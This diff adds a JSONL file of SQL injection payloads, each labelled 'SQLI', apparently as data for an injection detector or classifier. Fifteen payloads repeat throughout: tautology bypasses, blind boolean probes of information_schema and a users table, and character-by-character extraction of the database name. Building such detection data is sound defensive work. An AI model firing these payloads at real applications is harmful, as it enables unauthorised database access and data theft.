@@ -1,0 +1,300 @@
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='2", "attack_type": "SQLI"}
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' OR '1'='2", "attack_type": "SQLI"}
+{"payload": "' AND 1=1", "attack_type": "SQLI"}
+{"payload": "' AND 1=2", "attack_type": "SQLI"}
+{"payload": "' OR 1=1", "attack_type": "SQLI"}
+{"payload": "' OR 1=2", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM users)>0", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.tables)>10", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT 1 FROM dual) IS NOT NULL", "attack_type": "SQLI"}
+{"payload": "' AND EXISTS(SELECT 1 FROM users WHERE username='admin')", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='2", "attack_type": "SQLI"}
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' OR '1'='2", "attack_type": "SQLI"}
+{"payload": "' AND 1=1", "attack_type": "SQLI"}
+{"payload": "' AND 1=2", "attack_type": "SQLI"}
+{"payload": "' OR 1=1", "attack_type": "SQLI"}
+{"payload": "' OR 1=2", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM users)>0", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.tables)>10", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT 1 FROM dual) IS NOT NULL", "attack_type": "SQLI"}
+{"payload": "' AND EXISTS(SELECT 1 FROM users WHERE username='admin')", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='2", "attack_type": "SQLI"}
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' OR '1'='2", "attack_type": "SQLI"}
+{"payload": "' AND 1=1", "attack_type": "SQLI"}
+{"payload": "' AND 1=2", "attack_type": "SQLI"}
+{"payload": "' OR 1=1", "attack_type": "SQLI"}
+{"payload": "' OR 1=2", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM users)>0", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.tables)>10", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT 1 FROM dual) IS NOT NULL", "attack_type": "SQLI"}
+{"payload": "' AND EXISTS(SELECT 1 FROM users WHERE username='admin')", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='2", "attack_type": "SQLI"}
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' OR '1'='2", "attack_type": "SQLI"}
+{"payload": "' AND 1=1", "attack_type": "SQLI"}
+{"payload": "' AND 1=2", "attack_type": "SQLI"}
+{"payload": "' OR 1=1", "attack_type": "SQLI"}
+{"payload": "' OR 1=2", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM users)>0", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.tables)>10", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT 1 FROM dual) IS NOT NULL", "attack_type": "SQLI"}
+{"payload": "' AND EXISTS(SELECT 1 FROM users WHERE username='admin')", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='2", "attack_type": "SQLI"}
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' OR '1'='2", "attack_type": "SQLI"}
+{"payload": "' AND 1=1", "attack_type": "SQLI"}
+{"payload": "' AND 1=2", "attack_type": "SQLI"}
+{"payload": "' OR 1=1", "attack_type": "SQLI"}
+{"payload": "' OR 1=2", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM users)>0", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.tables)>10", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT 1 FROM dual) IS NOT NULL", "attack_type": "SQLI"}
+{"payload": "' AND EXISTS(SELECT 1 FROM users WHERE username='admin')", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='2", "attack_type": "SQLI"}
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' OR '1'='2", "attack_type": "SQLI"}
+{"payload": "' AND 1=1", "attack_type": "SQLI"}
+{"payload": "' AND 1=2", "attack_type": "SQLI"}
+{"payload": "' OR 1=1", "attack_type": "SQLI"}
+{"payload": "' OR 1=2", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM users)>0", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.tables)>10", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT 1 FROM dual) IS NOT NULL", "attack_type": "SQLI"}
+{"payload": "' AND EXISTS(SELECT 1 FROM users WHERE username='admin')", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='2", "attack_type": "SQLI"}
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' OR '1'='2", "attack_type": "SQLI"}
+{"payload": "' AND 1=1", "attack_type": "SQLI"}
+{"payload": "' AND 1=2", "attack_type": "SQLI"}
+{"payload": "' OR 1=1", "attack_type": "SQLI"}
+{"payload": "' OR 1=2", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM users)>0", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.tables)>10", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT 1 FROM dual) IS NOT NULL", "attack_type": "SQLI"}
+{"payload": "' AND EXISTS(SELECT 1 FROM users WHERE username='admin')", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='2", "attack_type": "SQLI"}
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' OR '1'='2", "attack_type": "SQLI"}
+{"payload": "' AND 1=1", "attack_type": "SQLI"}
+{"payload": "' AND 1=2", "attack_type": "SQLI"}
+{"payload": "' OR 1=1", "attack_type": "SQLI"}
+{"payload": "' OR 1=2", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM users)>0", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.tables)>10", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT 1 FROM dual) IS NOT NULL", "attack_type": "SQLI"}
+{"payload": "' AND EXISTS(SELECT 1 FROM users WHERE username='admin')", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='2", "attack_type": "SQLI"}
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' OR '1'='2", "attack_type": "SQLI"}
+{"payload": "' AND 1=1", "attack_type": "SQLI"}
+{"payload": "' AND 1=2", "attack_type": "SQLI"}
+{"payload": "' OR 1=1", "attack_type": "SQLI"}
+{"payload": "' OR 1=2", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM users)>0", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.tables)>10", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT 1 FROM dual) IS NOT NULL", "attack_type": "SQLI"}
+{"payload": "' AND EXISTS(SELECT 1 FROM users WHERE username='admin')", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='2", "attack_type": "SQLI"}
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' OR '1'='2", "attack_type": "SQLI"}
+{"payload": "' AND 1=1", "attack_type": "SQLI"}
+{"payload": "' AND 1=2", "attack_type": "SQLI"}
+{"payload": "' OR 1=1", "attack_type": "SQLI"}
+{"payload": "' OR 1=2", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM users)>0", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.tables)>10", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT 1 FROM dual) IS NOT NULL", "attack_type": "SQLI"}
+{"payload": "' AND EXISTS(SELECT 1 FROM users WHERE username='admin')", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='2", "attack_type": "SQLI"}
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' OR '1'='2", "attack_type": "SQLI"}
+{"payload": "' AND 1=1", "attack_type": "SQLI"}
+{"payload": "' AND 1=2", "attack_type": "SQLI"}
+{"payload": "' OR 1=1", "attack_type": "SQLI"}
+{"payload": "' OR 1=2", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM users)>0", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.tables)>10", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT 1 FROM dual) IS NOT NULL", "attack_type": "SQLI"}
+{"payload": "' AND EXISTS(SELECT 1 FROM users WHERE username='admin')", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='2", "attack_type": "SQLI"}
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' OR '1'='2", "attack_type": "SQLI"}
+{"payload": "' AND 1=1", "attack_type": "SQLI"}
+{"payload": "' AND 1=2", "attack_type": "SQLI"}
+{"payload": "' OR 1=1", "attack_type": "SQLI"}
+{"payload": "' OR 1=2", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM users)>0", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.tables)>10", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT 1 FROM dual) IS NOT NULL", "attack_type": "SQLI"}
+{"payload": "' AND EXISTS(SELECT 1 FROM users WHERE username='admin')", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='2", "attack_type": "SQLI"}
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' OR '1'='2", "attack_type": "SQLI"}
+{"payload": "' AND 1=1", "attack_type": "SQLI"}
+{"payload": "' AND 1=2", "attack_type": "SQLI"}
+{"payload": "' OR 1=1", "attack_type": "SQLI"}
+{"payload": "' OR 1=2", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM users)>0", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.tables)>10", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT 1 FROM dual) IS NOT NULL", "attack_type": "SQLI"}
+{"payload": "' AND EXISTS(SELECT 1 FROM users WHERE username='admin')", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='2", "attack_type": "SQLI"}
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' OR '1'='2", "attack_type": "SQLI"}
+{"payload": "' AND 1=1", "attack_type": "SQLI"}
+{"payload": "' AND 1=2", "attack_type": "SQLI"}
+{"payload": "' OR 1=1", "attack_type": "SQLI"}
+{"payload": "' OR 1=2", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM users)>0", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.tables)>10", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT 1 FROM dual) IS NOT NULL", "attack_type": "SQLI"}
+{"payload": "' AND EXISTS(SELECT 1 FROM users WHERE username='admin')", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='2", "attack_type": "SQLI"}
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' OR '1'='2", "attack_type": "SQLI"}
+{"payload": "' AND 1=1", "attack_type": "SQLI"}
+{"payload": "' AND 1=2", "attack_type": "SQLI"}
+{"payload": "' OR 1=1", "attack_type": "SQLI"}
+{"payload": "' OR 1=2", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM users)>0", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.tables)>10", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT 1 FROM dual) IS NOT NULL", "attack_type": "SQLI"}
+{"payload": "' AND EXISTS(SELECT 1 FROM users WHERE username='admin')", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='2", "attack_type": "SQLI"}
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' OR '1'='2", "attack_type": "SQLI"}
+{"payload": "' AND 1=1", "attack_type": "SQLI"}
+{"payload": "' AND 1=2", "attack_type": "SQLI"}
+{"payload": "' OR 1=1", "attack_type": "SQLI"}
+{"payload": "' OR 1=2", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM users)>0", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.tables)>10", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT 1 FROM dual) IS NOT NULL", "attack_type": "SQLI"}
+{"payload": "' AND EXISTS(SELECT 1 FROM users WHERE username='admin')", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='2", "attack_type": "SQLI"}
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' OR '1'='2", "attack_type": "SQLI"}
+{"payload": "' AND 1=1", "attack_type": "SQLI"}
+{"payload": "' AND 1=2", "attack_type": "SQLI"}
+{"payload": "' OR 1=1", "attack_type": "SQLI"}
+{"payload": "' OR 1=2", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM users)>0", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.tables)>10", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT 1 FROM dual) IS NOT NULL", "attack_type": "SQLI"}
+{"payload": "' AND EXISTS(SELECT 1 FROM users WHERE username='admin')", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='2", "attack_type": "SQLI"}
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' OR '1'='2", "attack_type": "SQLI"}
+{"payload": "' AND 1=1", "attack_type": "SQLI"}
+{"payload": "' AND 1=2", "attack_type": "SQLI"}
+{"payload": "' OR 1=1", "attack_type": "SQLI"}
+{"payload": "' OR 1=2", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM users)>0", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.tables)>10", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT 1 FROM dual) IS NOT NULL", "attack_type": "SQLI"}
+{"payload": "' AND EXISTS(SELECT 1 FROM users WHERE username='admin')", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='2", "attack_type": "SQLI"}
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' OR '1'='2", "attack_type": "SQLI"}
+{"payload": "' AND 1=1", "attack_type": "SQLI"}
+{"payload": "' AND 1=2", "attack_type": "SQLI"}
+{"payload": "' OR 1=1", "attack_type": "SQLI"}
+{"payload": "' OR 1=2", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM users)>0", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.tables)>10", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT 1 FROM dual) IS NOT NULL", "attack_type": "SQLI"}
+{"payload": "' AND EXISTS(SELECT 1 FROM users WHERE username='admin')", "attack_type": "SQLI"}
+{"payload": "' AND '1'='1", "attack_type": "SQLI"}
+{"payload": "' AND '1'='2", "attack_type": "SQLI"}
+{"payload": "' OR '1'='1", "attack_type": "SQLI"}
+{"payload": "' OR '1'='2", "attack_type": "SQLI"}
+{"payload": "' AND 1=1", "attack_type": "SQLI"}
+{"payload": "' AND 1=2", "attack_type": "SQLI"}
+{"payload": "' OR 1=1", "attack_type": "SQLI"}
+{"payload": "' OR 1=2", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM users)>0", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.tables)>10", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65", "attack_type": "SQLI"}
+{"payload": "' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90", "attack_type": "SQLI"}
+{"payload": "' AND (SELECT 1 FROM dual) IS NOT NULL", "attack_type": "SQLI"}
+{"payload": "' AND EXISTS(SELECT 1 FROM users WHERE username='admin')", "attack_type": "SQLI"}
